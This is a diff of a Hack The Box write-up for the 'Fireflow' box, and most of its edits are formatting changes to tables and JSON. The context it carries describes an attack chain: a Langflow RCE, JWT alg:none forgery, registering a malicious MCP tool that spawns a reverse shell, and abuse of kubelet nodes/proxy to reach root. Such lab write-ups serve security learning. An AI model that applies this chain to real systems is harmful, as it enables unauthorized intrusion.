@@ -2,6 +2,7 @@
 title: Fireflow
 description: Medium HTB Linux box chaining Langflow RCE (CVE-2026-33017), password reuse, MCP JWT alg:none forgery, and Kubernetes nodes/proxy to root.
 image: /static/fireflow.png
+event: Hack The Box
 tags:
   - writeup
   - htb
@@ -12,14 +13,13 @@ difficulty: medium
 date: 2026-08-02
 ---
 
-
-| | |
-|---|---|
-| **Machine** | Fireflow |
-| **Difficulty** | Medium |
-| **Category** | Web / Kubernetes / MCP / JWT |
-| **Target** | 10.129.3.34 |
-| **User Flag** | `3cb7e79e7dff23933c1eafc9fd214320` |
+|                |                                    |
+| -------------- | ---------------------------------- |
+| **Machine**    | Fireflow                           |
+| **Difficulty** | Medium                             |
+| **Category**   | Web / Kubernetes / MCP / JWT       |
+| **Target**     | 10.129.3.34                        |
+| **User Flag**  | `3cb7e79e7dff23933c1eafc9fd214320` |
 
 ---
 
@@ -339,7 +339,7 @@ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlI
 **Payload:**
 
 ```json
-{"sub":"langflow-bot","role":"user"}
+{ "sub": "langflow-bot", "role": "user" }
 ```
 
 The token has `role: user`. We want `role: admin`.
@@ -407,7 +407,7 @@ curl -X 'POST' 'http://10.129.3.34:30080/api/v1/tools' \
 **Result:**
 
 ```json
-{"status":"registered","name":"anan-shell"}
+{ "status": "registered", "name": "anan-shell" }
 ```
 
 The Python code forks out of the running process so the shell stays alive even after the MCP call closes.
@@ -430,7 +430,11 @@ curl -s -X 'POST' 'http://10.129.3.34:30080/mcp' \
 **Result:**
 
 ```json
-{"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":""}],"isError":false}}
+{
+  "jsonrpc": "2.0",
+  "id": 2,
+  "result": { "content": [{ "type": "text", "text": "" }], "isError": false }
+}
 ```
 
 We now have a **reverse shell inside the MCP pod** (`mcp-server`).
@@ -512,13 +516,13 @@ We have **`get` on `nodes/proxy`** — this is the jackpot.
 
 This effectively lets us talk to the **kubelet on port 10250** through the API server, bypassing the normal `pods/exec` RBAC check. Useful kubelet endpoints:
 
-| Endpoint | What it does |
-|----------|--------------|
-| `/pods` | List all pods on the node |
+| Endpoint                       | What it does                      |
+| ------------------------------ | --------------------------------- |
+| `/pods`                        | List all pods on the node         |
 | `/exec/<ns>/<pod>/<container>` | Execute commands in any container |
-| `/run/<ns>/<pod>/<container>` | Run a command (non-interactive) |
-| `/configz` | Kubelet configuration |
-| `/logs/` | Node log files |
+| `/run/<ns>/<pod>/<container>`  | Run a command (non-interactive)   |
+| `/configz`                     | Kubelet configuration             |
+| `/logs/`                       | Node log files                    |
 
 ### Port-forward the kubelet & enumerate pods
 
@@ -600,10 +604,10 @@ cat /host/root/root.txt
 
 ## Summary of Flags
 
-| Flag | Value |
-|------|-------|
-| **User flag** | `3cb7e79e7dff23933c1eafc9fd214320` |
-| **Root flag** | *(obtained from `/host/root/root.txt`)* |
+| Flag          | Value                                   |
+| ------------- | --------------------------------------- |
+| **User flag** | `3cb7e79e7dff23933c1eafc9fd214320`      |
+| **Root flag** | _(obtained from `/host/root/root.txt`)_ |
 
 ---
 
